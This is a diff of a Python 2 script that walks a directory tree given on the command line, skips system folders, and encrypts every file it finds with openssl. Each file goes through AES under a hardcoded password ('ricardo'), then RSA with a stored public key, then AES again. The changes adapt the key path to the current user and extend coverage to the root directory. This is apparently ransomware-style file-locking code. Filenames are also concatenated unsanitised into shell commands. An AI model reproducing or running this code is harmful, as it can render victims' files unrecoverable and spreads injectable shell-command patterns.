@@ -1,13 +1,18 @@
 import os,sys
+import getpass
 
 aes_password="ricardo"
-keypath="/home/test2/random/keys"
-excluded_dirs=["bin","boot","etc","usr","lib","media"]
+unme=getpass.getuser()
+keypath="/home/"+unme+"/random/keys"
+print "Keypath = ",keypath
+excluded_dirs=["bin","boot","etc","usr","lib","media","dev","usr","sbin","root"]
 
 
 def encrypt_(fname):
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+" -out "+fname+".aes")
-	os.system("openssl rsautl -encrypt -pubin -inkey "+keypath+"/public.pem -in "+fname+".aes -out "+fname+".rsa")
+	command=("openssl rsautl -encrypt -pubin -inkey "+keypath+"/public.pem -in "+fname+".aes -out "+fname+".rsa")
+	print command
+	os.system(command)
 	os.system("openssl aes-256-cbc -pass pass:"+aes_password+" -in "+fname+".rsa -out "+fname+".enc")
 	os.system("rm "+fname+".aes")
 	os.system("rm "+fname+".rsa")
@@ -22,14 +27,15 @@ def enc_files(dir_):
 		encrypt_(file)
 
 def loop(looped_dir):
+	#Files in the root dir
+	enc_files(looped_dir)
+	#Directories inside
 	for root,directories,filenames in os.walk(looped_dir):
 		for directory in directories:
 			dir=os.path.join(root, directory)
 			if directory not in excluded_dirs:
 				print "Entering",dir,"..."
 				enc_files(dir)
-
-	#			loop(dir)
 
 
 loop(sys.argv[1])
